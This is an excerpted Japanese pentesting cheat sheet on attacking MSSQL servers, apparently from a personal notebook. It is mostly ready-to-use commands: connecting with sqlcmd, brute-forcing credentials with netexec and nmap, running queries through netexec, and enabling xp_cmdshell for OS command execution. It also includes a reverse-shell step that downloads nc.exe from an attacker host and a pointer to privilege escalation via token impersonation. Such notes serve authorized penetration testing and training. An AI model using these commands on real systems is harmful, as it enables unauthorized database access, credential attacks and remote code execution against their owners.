...
```powershell
# インタラクティブモード
sqlcmd [-S <target_IP|domain>] -U <username> -P <password> -l 30

# 非インタラクティブモード
sqlcmd [-S <target_IP|domain>] -U <username> -P <password> -l 30 -Q "<SQL_query>"
```
...
クレデンシャルブルートフォース（アカウントロックの危険性有）
	※ ドメインはNetBIOS名を使用：[nbtscan](139,445%20-NetBIOS,%20SMB.md#Nbtscan)
```zsh
# netexec
netexec mssql -d <domain> -u <username_wordlist> -p <password_wordlist> <target_IP>

# nmap
nmap -p <Port> --script ms-sql-brute --script-args mssql.domain=<domain>,userdb=<username_wordlist>,passdb=<password_wordlist>,ms-sql-brute.brute-windows-accounts <target_IP>
```
...
nxc mssql <target_IP> -u <username> -p '<password>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```
...
- 攻撃概要：SQLからコマンドシェルへ文字列のコマンドをパスし、実行する
- 注意：デフォルトで無効のオプションを有効化する必要がある
- 権限："sysadmin"権限（SQL serverの最上権限）で、以下のクエリの結果１が返るユーザー
```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
-- 出力
-
...
5. リバースシェル（Netcat使用）
```sql
EXEC xp_cmdshell 'powershell iwr -Uri http://<attacker_IP>:<port>/nc.exe -OutFile c:\users\public\nc.exe'
```
```sql
...
MSSQLサービスを実行しているユーザーは通常 `SeImpersonatePrivilege` を持っているため、これで特権昇格が可能([Token Impersonationによる権限昇格](../🪟Windows/💥Windows%20Privilege%20Escalation.md#Token%20Impersonationによる権限昇格))
```sql
-- 1. 権限確認 
